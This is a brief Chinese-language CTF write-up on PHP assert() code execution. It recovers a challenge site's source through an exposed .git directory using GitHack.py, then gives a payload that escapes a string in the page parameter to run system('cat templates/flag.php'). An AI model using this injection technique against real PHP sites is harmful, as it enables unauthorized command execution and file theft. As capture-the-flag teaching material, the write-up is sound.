assert()：

把字符串执行php代码。



列题讲解：

浙大ctf http://web.jarvisoj.com:32798/

使用sourceLeakHacker扫描发现存在git目录。

![](images/26F46C4B78464D97A4E3ED6BE4E0C9A2clipboard.png)

使用gitHacker下载文件：

```javascript
    GitHack.py http://web.jarvisoj.com:32798/.git/
```



![](images/1E2211D175B447D7AEB48884E5070957clipboard.png)



下载网页源码，进入flag.php发现，没有flag。此时代码审计

![](images/A250AE466F09420DB9C2326A68BEFDF7clipboard.png)

发现存在assert()函数，推测是任意代码执行。

payload:

page='.system("cat templates/flag.php;").'